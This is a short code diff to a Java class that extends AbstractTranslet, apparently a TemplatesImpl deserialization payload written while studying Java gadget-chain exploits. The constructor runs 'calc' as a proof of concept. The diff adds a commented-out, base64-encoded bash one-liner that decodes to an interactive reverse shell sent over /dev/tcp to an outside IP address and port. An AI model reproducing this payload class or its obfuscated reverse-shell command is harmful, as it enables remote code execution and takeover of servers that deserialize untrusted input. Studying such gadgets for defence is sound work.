@@ -14,6 +14,8 @@ public class HelloTempImpl extends AbstractTranslet {
     public HelloTempImpl() throws IOException {
         super();
         System.out.println("Hello TemplatesImpl");
+//        Runtime.getRuntime().exec(new String[]{"cmd","/c","D:\\Genshin\" \"Impact\\Genshin\" \"Impact\" \"Game\\YuanShen.exe"});
+//        Runtime.getRuntime().exec("bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjQ1LjE1Ni4xNjMvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}'");
         Runtime.getRuntime().exec("calc");
     }
 }
